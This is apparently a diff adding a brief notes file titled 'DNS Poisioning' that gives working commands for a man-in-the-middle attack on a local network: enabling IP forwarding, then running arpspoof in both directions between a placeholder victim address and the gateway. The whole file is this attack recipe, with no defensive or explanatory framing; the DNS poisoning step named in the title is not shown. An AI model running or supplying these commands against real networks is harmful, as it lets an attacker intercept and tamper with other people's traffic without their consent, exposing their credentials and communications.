@@ -1,0 +1,8 @@
+DNS Poisioning
+
+# Enable IP forwarding so traffic still flows
+echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+
+# Run ARP spoofing (replace IPs with victim and gateway)
+sudo arpspoof -i wlan0 -t 192.168.1.6 192.168.1.1
+sudo arpspoof -i wlan0 -t 192.168.1.1 192.168.1.6
